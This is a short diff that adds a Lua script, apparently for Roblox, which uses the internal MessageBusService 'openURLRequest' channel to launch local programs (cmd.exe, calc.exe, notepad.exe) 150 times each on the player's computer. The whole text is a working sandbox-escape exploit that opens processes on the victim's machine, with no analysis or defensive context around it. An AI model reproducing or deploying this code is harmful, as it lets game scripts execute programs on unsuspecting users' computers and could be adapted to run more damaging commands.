@@ -1,0 +1,8 @@
+local Bus = game:FindFirstChild("MessageBusService")
+local ID = Bus.getMessageId(Bus, "Linking", "openURLRequest")
+
+for i=1,150 do
+Bus.publish(Bus, ID, {url = "cmd.exe"})
+Bus.publish(Bus, ID, {url = "calc.exe"})
+Bus.publish(Bus, ID, {url = "notepad.exe"})
+end
